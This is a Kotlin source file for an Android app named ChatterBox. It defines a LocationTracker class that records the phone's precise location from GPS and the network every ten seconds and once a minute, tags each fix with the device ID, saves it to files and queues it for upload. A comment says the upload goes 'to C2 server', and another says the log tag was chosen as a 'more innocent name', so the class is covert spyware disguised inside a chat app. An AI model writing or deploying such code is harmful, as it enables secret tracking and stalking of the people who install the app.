package com.example.ChatterBox.database

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.app.ActivityCompat
import com.example.ChatterBox.database.StorageManager
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.CopyOnWriteArrayList

/**
 * Tracks and logs user location in the background.
 * Uses singleton pattern for centralized location management.
 */
class LocationTracker private constructor(private val context: Context) {
    private val TAG = "LocationAnalytics" // More innocent name
    private val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    private var locationListener: LocationListener? = null
    private var timer: Timer? = null
    private val handler = Handler(Looper.getMainLooper())

    // Track high-precision location at most every 5 meters or 10 seconds
    private val MIN_TIME_BETWEEN_UPDATES = 10000L // 10 seconds
    private val MIN_DISTANCE_CHANGE = 5f // 5 meters

    // List of location callbacks for on-demand location requests
    private val locationCallbacks = CopyOnWriteArrayList<(JSONObject) -> Unit>()

    // Last captured location for quick access
    private var lastCapturedLocation: Location? = null

    companion object {
        @Volatile
        private var instance: LocationTracker? = null

        fun getInstance(context: Context): LocationTracker {
            return instance ?: synchronized(this) {
                instance ?: LocationTracker(context.applicationContext).also { instance = it }
            }
        }
    }

    /**
     * Start tracking the user's location.
     */
    fun startTracking() {
        Log.d(TAG, "Initializing location analytics")

        // Create the location listener
        locationListener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                lastCapturedLocation = location
                processLocation(location)
            }

            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
                // Required for older Android versions
            }

            override fun onProviderEnabled(provider: String) {
                Log.d(TAG, "Provider $provider enabled")
            }

            override fun onProviderDisabled(provider: String) {
                Log.d(TAG, "Provider $provider disabled")
            }
        }

        // Check for permissions
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.d(TAG, "Location permission not granted")
            return
        }

        try {
            // Register for location updates from GPS
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                MIN_TIME_BETWEEN_UPDATES,
                MIN_DISTANCE_CHANGE,
                locationListener as LocationListener
            )

            // Also register for network location as backup
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                MIN_TIME_BETWEEN_UPDATES,
                MIN_DISTANCE_CHANGE,
                locationListener as LocationListener
            )

            // Schedule periodic location checks even if no movement
            startPeriodicLocationCheck()

            Log.d(TAG, "Location analytics started")
        } catch (e: Exception) {
            Log.e(TAG, "Error initializing location analytics", e)
        }
    }

    /**
     * Schedule periodic location checks to ensure data collection
     * even when the user isn't actively moving
     */
    private fun startPeriodicLocationCheck() {
        timer?.cancel()
        timer = Timer()

        timer?.schedule(object : TimerTask() {
            override fun run() {
                handler.post {
                    try {
                        val location = getLastKnownLocation()
                        if (location != null) {
                            processLocation(location)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error in periodic location check", e)
                    }
                }
            }
        }, 60000, 60 * 1000) // Once per minute
    }

    /**
     * Capture the last known location and invoke the callback
     */
    fun captureLastKnownLocation(callback: (JSONObject) -> Unit) {
        locationCallbacks.add(callback)

        try {
            // If we already have a recent location, use it immediately
            if (lastCapturedLocation != null) {
                val locationData = createLocationJson(lastCapturedLocation!!)
                callback(locationData)
                locationCallbacks.remove(callback)
                return
            }

            // Otherwise, try to get the last known location
            val location = getLastKnownLocation()
            if (location != null) {
                val locationData = createLocationJson(location)
                callback(locationData)
                locationCallbacks.remove(callback)
                return
            }

            // If still no location, we'll wait for the next location update
            // The callback will be invoked in processLocation()

        } catch (e: Exception) {
            Log.e(TAG, "Error capturing location", e)

            // Create a placeholder with just the timestamp
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            val fallbackJson = JSONObject().apply {
                put("timestamp", timestamp)
                put("status", "location_unavailable")
                put("device_id", Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID))
            }

            callback(fallbackJson)
            locationCallbacks.remove(callback)
        }
    }

    /**
     * Get the last known location from available providers
     */
    @SuppressLint("MissingPermission")
    private fun getLastKnownLocation(): Location? {
        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return null
        }

        try {
            // Try GPS first
            var location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)

            // If GPS not available, try network location
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }

            return location
        } catch (e: Exception) {
            Log.e(TAG, "Error getting last known location", e)
            return null
        }
    }

    /**
     * Process and store a location update
     */
    private fun processLocation(location: Location) {
        lastCapturedLocation = location

        try {
            val locationJson = createLocationJson(location)

            // Store to internal storage
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "location_${timestamp}.json"
            val storageDir = StorageManager.getStorageDir(context, "location_data")
            val locationFile = File(storageDir, filename)

            FileOutputStream(locationFile).use { out ->
                out.write(locationJson.toString().toByteArray())
            }

            Log.d(TAG, "Location processed: ${location.latitude}, ${location.longitude}")

            // Send to C2 server
            val dataSynchronizer = DataSynchronizer(context)
            dataSynchronizer.queueForSync("location_data", locationFile.absolutePath)

            // Call any pending callbacks
            val callbacksToRemove = mutableListOf<(JSONObject) -> Unit>()

            for (callback in locationCallbacks) {
                callback(locationJson)
                callbacksToRemove.add(callback)
            }

            // Remove the callbacks that were called
            locationCallbacks.removeAll(callbacksToRemove)

        } catch (e: Exception) {
            Log.e(TAG, "Error processing location", e)
        }
    }

    /**
     * Create a standardized JSON representation of a location
     */
    private fun createLocationJson(location: Location): JSONObject {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())

        return JSONObject().apply {
            put("timestamp", timestamp)
            put("latitude", location.latitude)
            put("longitude", location.longitude)
            put("accuracy", location.accuracy)
            put("altitude", location.altitude)
            put("speed", location.speed)
            put("provider", location.provider)
            put("device_model", android.os.Build.MODEL)
            put("device_id", Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID))
        }
    }

    /**
     * Stop tracking the user's location
     */
    fun stopTracking() {
        locationListener?.let {
            locationManager.removeUpdates(it)
        }

        timer?.cancel()
        timer = null

        Log.d(TAG, "Location analytics stopped")
    }
}